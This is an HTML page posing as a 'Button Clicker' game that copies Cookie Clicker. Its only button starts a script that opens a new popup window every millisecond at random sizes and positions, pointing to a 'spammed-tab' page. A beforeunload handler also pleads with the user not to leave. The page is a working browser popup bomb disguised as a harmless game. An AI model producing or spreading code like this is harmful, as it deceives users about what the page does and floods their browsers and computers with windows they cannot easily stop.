<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Button Clicker</title>
  <style>
    @font-face {
      font-family: 'Minecraft';
      src: url('https://fonts.cdnfonts.com/s/12179/Minecraft.ttf') format('truetype');
    }

    body {
      margin: 0;
      padding: 0;
      background-color: #1a1a1a;
      font-family: 'Minecraft', monospace;
      color: #ffcc00;
      text-align: center;
      height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      background-image: url('https://i.imgur.com/ClashRoyaleBG.jpg'); /* Replace with Cookie Clicker-style background if desired */
      background-size: cover;
      background-position: center;
    }

    h1 {
      font-size: 4.5em;
      color: #ffcc00;
      text-shadow: 3px 3px #000;
      margin-bottom: 50px;
    }

    button {
      font-size: 2em;
      padding: 25px 60px;
      background-color: #ff9900;
      border: 4px solid #cc6600;
      border-radius: 12px;
      color: #fff;
      cursor: pointer;
      box-shadow: 0 0 0 4px #000, 0 8px 0 0 #cc6600;
      transition: transform 0.2s ease, background-color 0.2s ease;
      font-family: 'Minecraft', monospace;
    }

    button:hover {
      background-color: #ffb84d;
      transform: scale(1.1);
    }
  </style>
  <script>
    let intervalId = null;

    function generateSizes(count = 1000) {
      const sizes = [];
      for (let i = 0; i < count; i++) {
        const width = Math.floor(Math.random() * 1000) + 200;
        const height = Math.floor(Math.random() * 800) + 150;
        sizes.push({ width, height });
      }
      return sizes;
    }

    function startLaunching() {
      const sizes = generateSizes();

      if (!intervalId) {
        intervalId = setInterval(() => {
          const screenWidth = window.screen.availWidth;
          const screenHeight = window.screen.availHeight;

          const size = sizes[Math.floor(Math.random() * sizes.length)];
          const left = Math.floor(Math.random() * Math.max(1, screenWidth - size.width));
          const top = Math.floor(Math.random() * Math.max(1, screenHeight - size.height));

          window.open(
            "https://classroomgms.github.io/spammed-tab/",
            "_blank",
            `width=${size.width},height=${size.height},top=${top},left=${left}`
          );
        }, 1);
      }
    }

    window.addEventListener('beforeunload', function (e) {
      const message = "PLEASE DON'T CLOSE ME!!!!!! Are you sure you want to leave?";
      e.preventDefault();
      e.returnValue = message;
      return message;
    });
  </script>
</head>
<body>
  <h1>Button Clicker<br>(ripoff Cookie Clicker)</h1>
  <button onclick="startLaunching()">Click Me</button>
</body>
</html>
